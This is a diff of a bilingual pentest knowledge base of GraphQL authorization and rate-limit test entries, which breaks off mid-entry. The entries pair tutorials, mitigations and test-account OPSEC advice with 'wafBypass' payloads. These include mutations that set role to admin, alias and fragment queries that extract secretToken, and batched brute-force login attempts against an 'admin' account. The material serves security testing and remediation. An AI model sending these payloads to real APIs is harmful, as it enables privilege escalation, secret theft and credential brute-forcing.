@@ -1,1886 +1,2325 @@
 {
-  "schemaVersion": 1,
-  "contentStandard": 3,
-  "sourcePrefix": "api2",
-  "entries": [
+ "schemaVersion": 1,
+ "contentStandard": 3,
+ "sourcePrefix": "api2",
+ "entries": [
+  {
+   "id": "api2-mutation-idor",
+   "name": {
+    "zh": "GraphQL Mutation 对象级授权验证",
+    "en": "GraphQL Mutation Object-Level Authorization Validation"
+   },
+   "description": {
+    "zh": "验证 GraphQL Mutation 解析器是否依据当前主体与目标对象的关系执行对象级和属性级授权，而不是仅信任客户端提交的 userId、role 或 isAdmin 字段。",
+    "en": "Validate whether GraphQL mutation resolvers enforce object- and property-level authorization for the current principal instead of trusting client-supplied userId, role, or isAdmin fields."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "GraphQL 授权与 IDOR",
+    "en": "GraphQL Authorization & IDOR"
+   },
+   "prerequisites": [
     {
-      "id": "api2-mutation-idor",
-      "name": {
-        "zh": "GraphQL Mutation 对象级授权验证",
-        "en": "GraphQL Mutation Object-Level Authorization Validation"
-      },
-      "description": {
-        "zh": "验证 GraphQL Mutation 解析器是否依据当前主体与目标对象的关系执行对象级和属性级授权，而不是仅信任客户端提交的 userId、role 或 isAdmin 字段。",
-        "en": "Validate whether GraphQL mutation resolvers enforce object- and property-level authorization for the current principal instead of trusting client-supplied userId, role, or isAdmin fields."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "GraphQL 授权与 IDOR",
-        "en": "GraphQL Authorization & IDOR"
-      },
-      "prerequisites": [
-        {
-          "zh": "准备两个权限不同的测试账户，并分别创建可识别、可恢复的测试对象。",
-          "en": "Prepare two test accounts with different privileges and create identifiable, reversible test objects for each account."
-        },
-        {
-          "zh": "记录正常 Mutation 的对象 ID、允许字段、响应和服务端授权日志基线。",
-          "en": "Record the object ID, allowed fields, response, and server-side authorization-log baseline for a legitimate mutation."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL Mutation 对象级授权场景，检验解析器是否信任客户端提交的归属与角色字段。验证维度为跨对象写、角色提升与敏感字段修改三类 mutation 的单步矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL mutation object-level authorization, testing whether resolvers trust client-submitted ownership and role fields. Validation is a single-step matrix of cross-object writes, role elevation and sensitive-field mutations, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于 Mutation 解析器按参数直接定位并写对象：不校验主体归属也不隔离角色字段，攻击者改 id 与 role 即可改写他人数据并自我提权。",
-          "en": "The root cause is mutation resolvers locating and writing objects straight from arguments: without ownership checks or role-field isolation, changing id and role lets attackers rewrite others' data and self-elevate."
-        },
-        "exploitation": {
-          "zh": "第 1 步以当前身份逐条提交修改他人邮箱、提升 role 与改写 password 的 mutation，并先以自身对象执行一遍基线：服务端接受跨对象写入或特权字段即确认对象级授权缺失，记录每条响应与数据库前后状态。成功判据以写入生效记录为准。占位符在全局变量菜单替换；测试后立即回滚全部变更。",
-          "en": "In step 1, submit mutations modifying another user's email, elevating role and rewriting password one by one as the current identity, after baselining on your own object; acceptance of cross-object writes or privileged fields confirms the object-level gap, recording each response and database state before and after. Judge success by effective-write records. Replace placeholders via the global variables menu; roll back all changes immediately after testing."
-        },
-        "mitigation": {
-          "zh": "Mutation 解析器强制校验主体与目标对象归属，敏感字段走独立授权路径；GraphQL 层禁止客户端声明角色字段。修复后重放第 1 步，越权 mutation 应全部返回授权错误。",
-          "en": "Mutation resolvers must enforce principal-versus-object ownership with sensitive fields on separate authorization paths; the GraphQL layer should reject client-declared role fields. After the fix, replay step 1: unauthorized mutations should all return authorization errors."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "建立对象所有权基线",
-            "en": "Establish the ownership baseline"
-          },
-          "description": {
-            "zh": "由对象所有者执行最小 Mutation，记录允许字段、持久化状态和授权日志。",
-            "en": "Have the object owner run a minimal mutation and record allowed fields, persisted state, and authorization logs."
-          }
-        },
-        {
-          "title": {
-            "zh": "替换单一对象或属性",
-            "en": "Replace one object or property"
-          },
-          "description": {
-            "zh": "由第二个测试账户提交原始 Mutation 集合，每次只改变一个对象 ID 或敏感字段。",
-            "en": "Submit the original mutation set from the second test account, changing only one object identifier or sensitive field at a time."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "确认未授权状态变化",
-            "en": "Confirm unauthorized state change"
-          },
-          "description": {
-            "zh": "读取目标对象并关联数据库与审计日志，区分真实写入、字段被忽略和事务回滚。",
-            "en": "Read the target object and correlate database and audit logs to distinguish a real write from ignored fields or transaction rollback."
-          }
-        },
-        {
-          "title": {
-            "zh": "修复后执行交叉账户回归",
-            "en": "Run cross-account regression after remediation"
-          },
-          "description": {
-            "zh": "加入对象和字段授权后重放所有者与非所有者请求，确认正常写入保留且越权写入被拒绝。",
-            "en": "After adding object and field authorization, replay owner and non-owner requests to confirm legitimate writes remain and unauthorized writes are denied."
-          }
-        }
-      ],
-      "references": [
-        "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
-        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
-      ],
-      "analysis": {
-        "zh": "确认必须同时看到低权限主体、非其所有的目标对象和可重复的状态变化；仅暴露 Mutation 名称、返回 GraphQL 错误或修改自己的对象均不算越权。",
-        "en": "Confirmation requires a low-privilege principal, an object it does not own, and a repeatable state change. Exposed mutation names, GraphQL errors, or changes to the caller's own object do not establish broken authorization."
-      },
-      "opsecTips": [
-        {
-          "zh": "只操作专用测试对象，避免修改真实账户的邮箱、密码、角色或权限。",
-          "en": "Operate only on dedicated test objects; do not change real users' email, password, role, or permissions."
-        },
-        {
-          "zh": "每次只测试一个字段，并在下一次请求前恢复原值。",
-          "en": "Test one field at a time and restore its original value before the next request."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "原始内容是 GraphQL Mutation 请求体，用于验证对象级授权，不是工具命令。",
-        "issuesResolved": [
-          "corrected-name",
-          "corrected-scope",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "变量化 mutation 遮蔽",
-            "en": "Variable-Masked Mutation"
-          },
-          "command": "{\"query\":\"mutation($id:ID!,$r:String){updateUser(id:$id,role:$r){id role}}\",\"variables\":{\"id\":1,\"r\":\"admin\"}}",
-          "description": {
-            "zh": "把目标 id/role 移入变量绕过查询体中的参数特征检测。成功判据：角色被改为 admin。",
-            "en": "Moving id/role into variables masks parameter signatures inside the query text. Success: the role becomes admin."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "{\"query\":\"mutation($id:ID!,$r:String){updateUser(id:$id,role:$r){id role}}\"",
-              "explanation": {
-                "zh": "参数移入变量",
-                "en": "Parameters moved to variables"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "\"variables\":{\"id\":1,\"r\":\"admin\"}",
-              "explanation": {
-                "zh": "变量取值",
-                "en": "Variable values"
-              },
-              "type": "value"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "别名批量越权",
-            "en": "Aliased Batch Escalation"
-          },
-          "command": "mutation{a:updateUser(id:1,role:\"admin\"){id} b:updateUser(id:2,role:\"admin\"){id} c:updateUser(id:3,role:\"admin\"){id}}",
-          "description": {
-            "zh": "单请求别名批量修改多对象绕过每请求一次的对象级检查。成功判据：多个对象同时被改。",
-            "en": "Aliased batch mutations bypass per-request object checks. Success: multiple objects are modified at once."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "a:updateUser(id:1,role:\"admin\"){id}",
-              "explanation": {
-                "zh": "别名 a 改对象一",
-                "en": "Alias a hits object one"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "c:updateUser(id:3,role:\"admin\"){id}",
-              "explanation": {
-                "zh": "别名 c 改对象三",
-                "en": "Alias c hits object three"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "片段复用字段",
-            "en": "Fragment-Reuse Fields"
-          },
-          "command": "mutation{updateUser(id:1){...F}} fragment F on User{id email role secretToken}",
-          "description": {
-            "zh": "把敏感返回字段放进片段绕过 mutation 字段白名单。成功判据：返回片段字段内容。",
-            "en": "Placing sensitive return fields in a fragment bypasses mutation field whitelists. Success: fragment fields are returned."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "mutation{updateUser(id:1){...F}}",
-              "explanation": {
-                "zh": "片段展开字段",
-                "en": "Fragment spread field"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment F on User{id email role secretToken}",
-              "explanation": {
-                "zh": "片段含敏感字段",
-                "en": "Fragment with sensitive fields"
-              },
-              "type": "payload"
-            }
-          ]
-        }
-      ]
+     "zh": "准备两个权限不同的测试账户，并分别创建可识别、可恢复的测试对象。",
+     "en": "Prepare two test accounts with different privileges and create identifiable, reversible test objects for each account."
     },
     {
-      "id": "api2-",
-      "name": {
-        "zh": "GraphQL 内联片段字段授权验证",
-        "en": "GraphQL Inline-Fragment Field Authorization Validation"
-      },
-      "description": {
-        "zh": "验证接口在使用内联片段切换具体对象类型时，是否仍对 Admin、Root、Internal 等类型上的敏感字段执行一致的运行时授权。",
-        "en": "Validate whether the API consistently enforces runtime authorization for sensitive fields on Admin, Root, Internal, and related concrete types selected through inline fragments."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "GraphQL 授权与 IDOR",
-        "en": "GraphQL Authorization & IDOR"
-      },
-      "prerequisites": [
-        {
-          "zh": "已获得低权限测试账户，并知道至少一个正常可查询的接口或联合类型。",
-          "en": "A low-privilege test account and at least one normally queryable interface or union type are available."
-        },
-        {
-          "zh": "已记录不使用内联片段时的字段可见性、错误结构和解析器日志。",
-          "en": "Field visibility, error structure, and resolver logs without inline fragments have been recorded."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL 内联片段字段授权场景，检验类型切换时敏感字段的运行时授权一致性。验证维度为 Admin、Root 与 Internal 类型的片段查询矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL inline-fragment field authorization, testing runtime authorization consistency for sensitive fields under type switching. Validation is a fragment-query matrix over Admin, Root and Internal types, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于字段授权绑定在具体类型解析器而内联片段绕过外层校验：低权用户以片段切入高权类型后即可直接读取密钥与口令等敏感字段。",
-          "en": "The root cause is field authorization bound to concrete-type resolvers while inline fragments sidestep outer checks: low-privilege users slicing into privileged types via fragments can directly read secrets, passwords and peers."
-        },
-        "exploitation": {
-          "zh": "第 1 步按脚本把内联片段变体逐条提交并记录每个变体的返回字段：越权字段随片段返回即确认字段级授权缺失，再对照无片段的显式查询结果以界定绕过范围，记录越权字段清单与值类型留证。占位符在全局变量菜单替换。",
-          "en": "In step 1, submit inline-fragment variants one by one per the script, recording each variant's returned fields; unauthorized fields riding fragments confirm missing field-level authorization, contrasted with explicit fragment-free query results to bound the bypass, recording unauthorized field lists and value types as evidence. Replace placeholders via the global variables menu."
-        },
-        "mitigation": {
-          "zh": "字段级授权下沉到统一中间件并覆盖片段展开路径，高权类型字段默认拒绝显式放行。修复后重放第 1 步矩阵，越权字段应返回授权错误。",
-          "en": "Sink field-level authorization into unified middleware covering fragment expansion, defaulting privileged-type fields to deny unless allowed. After the fix, replay the step 1 matrix: unauthorized fields should return authorization errors."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "记录直接字段访问基线",
-            "en": "Record direct-field access baseline"
-          },
-          "description": {
-            "zh": "以低权限账户查询公开字段，记录类型名、字段错误和实际调用的解析器。",
-            "en": "Query public fields as a low-privilege user and record type names, field errors, and invoked resolvers."
-          }
-        },
-        {
-          "title": {
-            "zh": "逐个加入具体类型片段",
-            "en": "Add concrete-type fragments individually"
-          },
-          "description": {
-            "zh": "重放原始内联片段集合，每次只选择一个具体类型和一个敏感字段。",
-            "en": "Replay the original inline-fragment set while selecting only one concrete type and one sensitive field per request."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "比较角色与查询路径",
-            "en": "Compare roles and query paths"
-          },
-          "description": {
-            "zh": "用高低权限账户比较直接、Node、搜索和 me 路径，确认差异来自授权而非类型解析。",
-            "en": "Compare direct, Node, search, and me paths across high- and low-privilege accounts to isolate authorization from type resolution."
-          }
-        },
-        {
-          "title": {
-            "zh": "统一策略并执行 schema 回归",
-            "en": "Unify policy and run schema regression"
-          },
-          "description": {
-            "zh": "复用字段授权策略后枚举所有可达路径，确认敏感字段始终拒绝未授权主体。",
-            "en": "After reusing the field policy, enumerate every reachable path and confirm sensitive fields consistently reject unauthorized principals."
-          }
-        }
-      ],
-      "references": [
-        "https://spec.graphql.org/October2021/#sec-Inline-Fragments",
-        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
-      ],
-      "analysis": {
-        "zh": "只有同一低权限主体通过片段路径获得直接路径不可见的真实敏感值，才说明授权不一致；类型名可见、字段为 null 或验证阶段拒绝均不是漏洞。",
-        "en": "An authorization inconsistency is confirmed only when the same low-privilege principal obtains a real sensitive value through a fragment path that is unavailable directly. Type-name visibility, null fields, or validation rejection are not vulnerabilities."
-      },
-      "opsecTips": [
-        {
-          "zh": "一次只选择一个敏感字段，避免宽查询触发不必要的数据读取。",
-          "en": "Select one sensitive field at a time to avoid unnecessary broad data access."
-        },
-        {
-          "zh": "使用测试租户和虚构字段值保存证据，不导出真实密钥或个人信息。",
-          "en": "Use a test tenant and synthetic field values for evidence; do not export real secrets or personal data."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "原始内容是 GraphQL 内联片段查询，用于字段授权一致性验证，不是工具手册。",
-        "issuesResolved": [
-          "repaired-corrupt-english",
-          "corrected-name",
-          "clarified-negative-controls",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "嵌套双片段提权",
-            "en": "Nested Dual-Fragment Escalation"
-          },
-          "command": "query{user(id:1){...A ...B}} fragment A on Admin{id username} fragment B on RootAdmin{role secretToken}",
-          "description": {
-            "zh": "双片段组合绕过单片段的字段授权检查。成功判据：返回特权片段字段。",
-            "en": "Dual fragments bypass field authorization applied per single fragment. Success: privileged fragment fields return."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{user(id:1){...A ...B}}",
-              "explanation": {
-                "zh": "双片段展开",
-                "en": "Dual fragment spread"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment B on RootAdmin{role secretToken}",
-              "explanation": {
-                "zh": "特权片段定义",
-                "en": "Privileged fragment def"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "变量条件片段",
-            "en": "Variable-Conditional Fragment"
-          },
-          "command": "{\"query\":\"query($b:Boolean!){user(id:1){...A @include(if:$b)}} fragment A on Admin{id email role secretToken}\",\"variables\":{\"b\":true}}",
-          "description": {
-            "zh": "片段执行与否由变量控制，绕过静态字段审计。成功判据：变量开启时返回特权字段。",
-            "en": "Fragment execution toggled by a variable bypasses static field auditing. Success: privileged fields return when the variable is on."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "{\"query\":\"query($b:Boolean!){user(id:1){...A @include(if:$b)}}",
-              "explanation": {
-                "zh": "变量控制片段",
-                "en": "Variable-controlled fragment"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "\"variables\":{\"b\":true}",
-              "explanation": {
-                "zh": "开启片段的变量",
-                "en": "Fragment-enabling variable"
-              },
-              "type": "value"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "别名复用特权字段",
-            "en": "Alias-Reuse Privileged Fields"
-          },
-          "command": "query{user(id:1){a:id b:email c:role d:secretToken}}",
-          "description": {
-            "zh": "别名映射敏感字段绕过字段名白名单。成功判据：别名项返回敏感值。",
-            "en": "Aliasing sensitive fields bypasses field-name whitelists. Success: aliased entries return sensitive values."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{user(id:1){a:id b:email c:role d:secretToken}}",
-              "explanation": {
-                "zh": "别名映射字段",
-                "en": "Alias-mapped fields"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "d:secretToken",
-              "explanation": {
-                "zh": "别名取敏感字段",
-                "en": "Aliased sensitive field"
-              },
-              "type": "payload"
-            }
-          ]
-        }
-      ]
-    },
-    {
-      "id": "api2-alias",
-      "name": {
-        "zh": "GraphQL Alias 批量操作限流验证",
-        "en": "GraphQL Alias Batch-Operation Rate-Limit Validation"
-      },
-      "description": {
-        "zh": "验证服务端是否按一次 HTTP 请求而不是按实际 resolver 操作计数，导致登录、二次验证或对象查询可通过多个 Alias 在单次文档中绕过速率和成本限制。",
-        "en": "Validate whether the server counts only HTTP requests instead of resolver operations, allowing login, second-factor, or object lookups under multiple aliases to bypass rate and cost limits in one document."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "批量查询与资源滥用",
-        "en": "Batch Queries & Resource Abuse"
-      },
-      "prerequisites": [
-        {
-          "zh": "使用专用测试账户和可重置的验证码流程，并获得明确的请求速率上限。",
-          "en": "Use a dedicated test account and resettable verification flow, with an explicitly approved request-rate ceiling."
-        },
-        {
-          "zh": "记录单操作请求的计数器、响应扩展、认证日志和锁定行为。",
-          "en": "Record counters, response extensions, authentication logs, and lockout behavior for a single-operation request."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL Alias 批量操作限流场景，检验限流按请求还是按 resolver 计数的实现差异。验证维度为多别名登录与验证码查询的单文档矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL alias-batched operation rate limiting, testing whether throttles count requests or resolver invocations. Validation is a single-document matrix of multi-alias logins and code queries, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于限流器挂在 HTTP 层而文档内 alias 可打包任意多次尝试：单请求完成上百次登录或验证码猜测，暴力破解效率被放大百倍。",
-          "en": "The root cause is throttles mounted at the HTTP layer while aliases pack unlimited attempts into one document: a single request performs hundreds of login or code guesses, multiplying brute-force efficiency a hundredfold."
-        },
-        "exploitation": {
-          "zh": "第 1 步按脚本构造携带多别名登录或验证码查询的文档逐条提交，记录响应中各 alias 的独立结果：单请求内多次尝试全部独立执行即确认别名绕过限流，统计单文档最大尝试容量。成功判据以多 alias 独立响应为准。占位符在全局变量菜单替换。",
-          "en": "In step 1, build documents carrying multi-alias logins or code queries and submit one by one per the script, recording each alias's independent result; all attempts within one request executing independently confirm the alias throttle bypass, with per-document attempt capacity tallied. Judge success by independent multi-alias responses. Replace placeholders via the global variables menu."
-        },
-        "mitigation": {
-          "zh": "限流按文档内操作数与主体双层计数并限制别名数量，登录类 resolver 强制独立节流。修复后重放第 1 步，超限文档应在校验阶段被拒绝。",
-          "en": "Throttle per document-operation counts and principals with alias caps, enforcing independent throttles on login-type resolvers. After the fix, replay step 1: over-limit documents should be rejected at validation."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "测量单操作计数",
-            "en": "Measure single-operation accounting"
-          },
-          "description": {
-            "zh": "发送一个无效测试值，记录账户计数器、解析器调用和锁定阈值。",
-            "en": "Send one invalid test value and record the account counter, resolver calls, and lockout threshold."
-          }
-        },
-        {
-          "title": {
-            "zh": "提交受限 Alias 集合",
-            "en": "Submit a bounded alias set"
-          },
-          "description": {
-            "zh": "使用原始 Alias 请求但限制在批准的少量测试值，观察实际执行操作数。",
-            "en": "Use the original alias request with a small approved set of test values and observe the number of operations actually executed."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "关联限流与认证日志",
-            "en": "Correlate throttling and authentication logs"
-          },
-          "description": {
-            "zh": "比较 HTTP 请求数、resolver 调用数和失败计数，确认是否存在计费差异。",
-            "en": "Compare HTTP request count, resolver invocation count, and failure counters to identify accounting differences."
-          }
-        },
-        {
-          "title": {
-            "zh": "加入操作级限制并复测",
-            "en": "Add operation-level limits and retest"
-          },
-          "description": {
-            "zh": "限制 Alias 和查询成本后重放相同文档，确认每个敏感操作均被独立计数或整体拒绝。",
-            "en": "After limiting aliases and query cost, replay the document and confirm every sensitive operation is metered independently or the document is rejected."
-          }
-        }
-      ],
-      "references": [
-        "https://graphql.org/learn/security/",
-        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
-      ],
-      "analysis": {
-        "zh": "确认依据是一次 HTTP 请求实际执行多个敏感 resolver，且后端失败计数或成本只增加一次。仅支持 Alias、返回多个普通查询结果或网关记录一个请求不等于限流绕过。",
-        "en": "Confirmation requires one HTTP request to execute multiple sensitive resolvers while backend failure or cost accounting increments only once. Alias support, multiple ordinary results, or one gateway request log alone does not prove a bypass."
-      },
-      "opsecTips": [
-        {
-          "zh": "只使用专用账户和少量无效测试值，不进行凭证字典或验证码空间遍历。",
-          "en": "Use a dedicated account and a few invalid test values; do not traverse credential dictionaries or verification-code spaces."
-        },
-        {
-          "zh": "设置最大 Alias 数和立即停止阈值，监控锁定与下游调用。",
-          "en": "Set a maximum alias count and immediate stop threshold while monitoring lockout and downstream calls."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "原始内容是 Alias 组合请求，用于验证操作级限流；不是工具命令，用户枚举样例作为同一计费边界的对照保留。",
-        "issuesResolved": [
-          "corrected-name",
-          "bounded-bruteforce-scope",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "变量数组批量凭据",
-            "en": "Variable-Array Batch Credentials"
-          },
-          "command": "{\"query\":\"query($u:[String!]!,$p:[String!]!){r:loginBatch(user:$u,pass:$p){token}}\",\"variables\":{\"u\":[\"admin\",\"admin\",\"admin\"],\"p\":[\"password1\",\"password2\",\"password3\"]}}",
-          "description": {
-            "zh": "凭据移入变量数组绕过查询体特征与单查询限速。成功判据：批量返回至少一个 token。",
-            "en": "Credentials moved into variable arrays bypass query signatures and per-query limits. Success: at least one token returns in batch."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "{\"query\":\"query($u:[String!]!,$p:[String!]!){r:loginBatch(user:$u,pass:$p){token}}\"",
-              "explanation": {
-                "zh": "变量数组批量",
-                "en": "Variable-array batch"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "\"u\":[\"admin\",\"admin\",\"admin\"]",
-              "explanation": {
-                "zh": "用户名数组取值",
-                "en": "Username array value"
-              },
-              "type": "value"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "片段复用别名",
-            "en": "Fragment-Reuse Aliases"
-          },
-          "command": "query{a:login(...){...C} b:login(...){...C} c:login(...){...C}} fragment C on AuthToken{token user{id role}}",
-          "description": {
-            "zh": "共享片段承载批量别名降低查询长度特征。成功判据：限速未触发且返回多个结果。",
-            "en": "A shared fragment carries batched aliases, lowering length signatures. Success: no rate limit triggers and multiple results return."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{a:login(...){...C} b:login(...){...C} c:login(...){...C}}",
-              "explanation": {
-                "zh": "共享片段别名",
-                "en": "Shared-fragment aliases"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment C on AuthToken{token user{id role}}",
-              "explanation": {
-                "zh": "共享令牌片段",
-                "en": "Shared token fragment"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "单字母别名变形",
-            "en": "Single-Letter Alias Mutation"
-          },
-          "command": "query{a1:login(username:\"admin\",password:\"pw1\"){token} b1:login(username:\"admin\",password:\"pw2\"){token} c1:login(username:\"admin\",password:\"pw3\"){token}}",
-          "description": {
-            "zh": "规律别名前缀与最小长度绕过批量查询检测的长度阈值。成功判据：单请求完成多次尝试。",
-            "en": "Regular alias prefixes with minimal length bypass batch-detection thresholds. Success: multiple attempts complete in one request."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{a1:login(username:\"admin\",password:\"pw1\"){token}",
-              "explanation": {
-                "zh": "短前缀别名登录",
-                "en": "Short-prefix alias login"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "c1:login(username:\"admin\",password:\"pw3\"){token}}",
-              "explanation": {
-                "zh": "第三别名登录",
-                "en": "Third alias login"
-              },
-              "type": "payload"
-            }
-          ]
-        }
-      ]
-    },
-    {
-      "id": "api2-batch-query",
-      "name": {
-        "zh": "GraphQL HTTP 批处理策略验证",
-        "en": "GraphQL HTTP Batch Policy Validation"
-      },
-      "description": {
-        "zh": "验证 GraphQL HTTP 端点接受请求数组时，是否对数组内每个操作分别执行认证、授权、成本、事务和速率限制，而不是只检查外层请求。",
-        "en": "Validate whether a GraphQL HTTP endpoint that accepts request arrays applies authentication, authorization, cost, transaction, and rate controls to every enclosed operation rather than only the outer request."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "批量查询与资源滥用",
-        "en": "Batch Queries & Resource Abuse"
-      },
-      "prerequisites": [
-        {
-          "zh": "已确认目标明确支持 GraphQL 批处理，并准备只含测试数据的读写操作。",
-          "en": "The target explicitly supports GraphQL batching and read/write operations containing test data only are prepared."
-        },
-        {
-          "zh": "已记录单请求的认证、授权、成本、事务和错误返回基线。",
-          "en": "Authentication, authorization, cost, transaction, and error baselines for a single request have been recorded."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL HTTP 批处理策略场景，检验数组批处理下逐操作的认证、授权与成本控制。验证维度为混合查询数组与批量 mutation 的提交矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL HTTP batching policy, testing per-operation authentication, authorization and cost control under array batching. Validation is a submission matrix of mixed query arrays and batched mutations, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于中间件只校验批处理请求的外层封装而数组内操作逐一逃逸检查：低权会话一次请求完成多条越权查询，限流与审计同时失效。",
-          "en": "The root cause is middleware validating only the batch envelope while arrayed operations individually escape checks: low-privilege sessions run many unauthorized queries per request as throttles and audits fail together."
-        },
-        "exploitation": {
-          "zh": "第 1 步按脚本把混合权限查询与批量 mutation 数组逐条提交 GraphQL 端点，记录数组内每条操作的执行结果：多条操作一次性执行且含越权结果即确认批处理策略缺失。成功判据以数组内操作结果矩阵为准。占位符在全局变量菜单替换。",
-          "en": "In step 1, submit mixed-privilege query arrays and batched mutations to the GraphQL endpoint one by one per the script, recording each arrayed operation's outcome; multiple operations executing at once with unauthorized results among them confirm missing batching policy. Judge success by the arrayed-operation outcome matrix. Replace placeholders via the global variables menu."
-        },
-        "mitigation": {
-          "zh": "禁用或严格限制 HTTP 批处理并对数组内每条操作独立走鉴权与成本核算，超限整批拒绝。修复后重放第 1 步矩阵，越权操作应逐条失败。",
-          "en": "Disable or strictly limit HTTP batching, running authentication and cost accounting independently per arrayed operation and rejecting whole batches over limit. After the fix, replay the step 1 matrix: unauthorized operations should fail individually."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "确认批处理协议与基线",
-            "en": "Confirm batch protocol and baseline"
-          },
-          "description": {
-            "zh": "用两个无害查询确认数组格式、元素顺序、错误结构和服务端日志关联方式。",
-            "en": "Use two harmless queries to confirm array format, element ordering, error structure, and server-log correlation."
-          }
-        },
-        {
-          "title": {
-            "zh": "加入拒绝与可回滚操作",
-            "en": "Add a denial and reversible operation"
-          },
-          "description": {
-            "zh": "在测试数据上提交原始批处理形态，逐项观察身份、授权和事务边界。",
-            "en": "Submit the original batch shape against test data and observe identity, authorization, and transaction boundaries per element."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "核对元素级成本与副作用",
-            "en": "Check element-level cost and side effects"
-          },
-          "description": {
-            "zh": "比较外层请求计数与内部操作、数据库提交和审计事件，定位控制作用域差异。",
-            "en": "Compare outer-request accounting with inner operations, database commits, and audit events to locate control-scope mismatches."
-          }
-        },
-        {
-          "title": {
-            "zh": "限制批大小并验证隔离",
-            "en": "Limit batch size and validate isolation"
-          },
-          "description": {
-            "zh": "应用数组长度、总成本和元素级授权后重放，确认部分失败不会越权或污染其他元素。",
-            "en": "After applying array-length, aggregate-cost, and per-element authorization controls, replay and confirm partial failures cannot authorize or contaminate other elements."
-          }
-        }
-      ],
-      "references": [
-        "https://graphql.org/learn/serving-over-http/",
-        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
-      ],
-      "analysis": {
-        "zh": "接受批请求本身不是漏洞。必须证明某个内部操作绕过了单操作时存在的授权、限流、成本或事务控制，并能通过元素级日志和状态变化重复验证。",
-        "en": "Accepting batch requests is not itself a vulnerability. A finding requires an inner operation to bypass authorization, rate, cost, or transaction controls that apply to the same standalone operation, confirmed through element-level logs and state."
-      },
-      "opsecTips": [
-        {
-          "zh": "将删除和角色修改示例替换为专用测试对象上的可回滚标记写入。",
-          "en": "Replace deletion and role-change examples with reversible marker writes on dedicated test objects."
-        },
-        {
